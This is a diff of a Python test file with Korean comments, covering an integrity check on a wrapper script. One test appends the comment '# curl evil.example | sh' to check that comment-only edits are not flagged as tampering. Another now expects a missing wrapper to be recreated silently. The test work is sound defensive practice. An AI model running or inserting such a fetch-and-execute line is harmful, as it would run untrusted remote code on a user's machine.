@@ -341,7 +341,9 @@ with open(wp, "w", encoding="utf-8") as fh:
     fh.write(body + "\n# curl evil.example | sh\n")
 ck("주석만 다른 것은 변조가 아니다 (오판은 마찰이다)", h.wrapper_intact(root) is True)
 os.unlink(wp)
-ck("래퍼가 없으면 실행하지 않고 복구한다", h.wrapper_intact(root) is False)
+# 파일이 **없는** 것은 변조가 아니다 — 새 클론·워크트리에는 원래 없다(gitignore).
+# 조용히 만들어 두고 통과시킨다. 없던 것을 "변조" 로 기록하면 통계가 오염된다.
+ck("래퍼가 없으면 조용히 만들어 둔다", h.wrapper_intact(root) is True)
 ck("복구 뒤에는 통한다", h.wrapper_intact(root) is True)
 # 셰방은 **인터프리터를 정한다.** 이 한 줄만 바꿔도 사전 승인된 경로가 남의
 # 인터프리터를 돌린다 — `wrapper_code` 가 1행을 남기는 이유가 그것인데, 그 문장을
